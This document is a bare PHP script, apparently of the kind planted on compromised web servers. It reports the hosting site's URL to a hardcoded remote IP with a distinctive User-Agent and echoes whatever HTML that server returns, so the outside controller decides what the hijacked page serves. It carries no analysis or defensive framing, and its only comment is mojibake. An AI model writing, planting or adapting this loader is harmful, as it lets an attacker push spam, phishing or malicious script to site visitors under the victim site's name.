<?php
set_time_limit(0);
header("Content-Type: text/html;charset=gb2312");
$Remote_server = "http://216.244.86.57/vb/";  //¿Í»§¶ËµØÖ·
$host_name = "http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
$Content_mb=getHTTPPage($Remote_server."/index.php?host=".$host_name);

function getHTTPPage($url) {
	$opts = array(
	  'http'=>array(
		'method'=>"GET",
		'header'=>"User-Agent: aQ0O010O"
	  )
	);
	$context = stream_context_create($opts);
	$html = @file_get_contents($url, false, $context);
	if (empty($html)) {
		exit("<p align='center'><font color='red'><b>Connection Error!</b></font></p>");
	}	
	return $html;
} 

echo $Content_mb;
?>